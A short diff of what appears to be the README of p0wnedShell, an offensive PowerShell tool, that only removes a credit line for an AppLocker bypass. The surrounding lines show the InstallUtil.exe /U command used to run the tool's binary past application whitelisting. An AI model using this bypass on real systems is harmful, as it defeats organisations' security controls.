@@ -45,7 +45,7 @@ cd \Windows\Microsoft.NET\Framework\v4.0.30319 (Or newer .NET version folder)
 InstallUtil.exe /logfile= /LogToConsole=false /U C:\p0wnedShell\p0wnedShellx86.exe
 ```
 
-To run as x64 binary and bypass Applocker (Credits for this great bypass go to Casey Smith aka subTee):
+To run as x64 binary and bypass Applocker:
 
 ```
 cd \Windows\Microsoft.NET\Framework64\v4.0.30319 (Or newer .NET version folder)
